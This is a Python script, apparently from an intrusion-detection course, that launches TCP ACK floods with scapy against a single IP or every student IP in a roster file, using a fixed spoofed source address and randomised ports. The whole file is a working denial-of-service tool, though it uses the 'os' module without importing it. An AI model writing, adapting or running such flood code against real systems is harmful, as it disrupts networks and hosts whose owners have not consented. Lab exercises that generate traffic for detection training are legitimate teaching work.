import json
import argparse
import random
import time

# scapy import only when used
try:
    from scapy.all import IP, TCP, send
except ImportError:
    pass


def load_roster(path):
    """Read and decode a JSON roster file into a dictionary.

    Args:
        path (str): filesystem path to roster JSON.

    Returns:
        dict: mapping of group names -> {student: ip}
    """
    with open(path) as f:
        return json.load(f)


def ack_flood(dest_ip, dest_port, packet_count=1000, src_ip="192.168.28.203"):
    """Send a burst of TCP ACK packets to the specified target.

    The source port is randomized for each packet. A brief sleep is
    inserted to limit the rate.
    """
    for _ in range(packet_count):
        src_port = random.randint(1024, 65535)
        pkt = IP(src=src_ip, dst=dest_ip) / TCP(sport=src_port, dport=dest_port, flags="A")
        send(pkt, verbose=False)
        time.sleep(0.01)


def attack_group(group_name, roster, port, count):
    if group_name not in roster:
        return

    group = roster[group_name]
    for student, ip in group.items():
        ack_flood(ip, port, packet_count=count)


def main():
    parser = argparse.ArgumentParser(description="ACK flood launcher")

    parser.add_argument(
        "--roster",
        default="ids_sec3_students.json",
        help="Roster JSON file (default: ids_sec3_students.json)"
    )

    parser.add_argument("--target-group", help="Group name (e.g., group1)")
    parser.add_argument("--target-ip", help="Single IP (e.g., 192.168.2.26)")
    parser.add_argument("--port", type=int, default=5555,
                        help="Destination TCP port (default 5555)")
    parser.add_argument("--count", type=int, default=1000,
                        help="Number of packets to send (default 1000)")

    args = parser.parse_args()

    # load roster only if needed
    roster = {}
    if args.target_group:
        if not args.roster or not args.roster.strip():
            roster_path = "ids_sec3_students.json"
        else:
            roster_path = args.roster

        if not os.path.exists(roster_path):
            print("Roster file required when using --target-group (", roster_path, ")")
            return
        roster = load_roster(roster_path)

    if args.target_ip:
        ack_flood(args.target_ip, args.port, packet_count=args.count)

    if args.target_group:
        attack_group(args.target_group, roster, port=args.port, count=args.count)

    if not args.target_ip and not args.target_group:
        print("Use --target-group <name> or --target-ip <ip>")


if __name__ == "__main__":
    main()
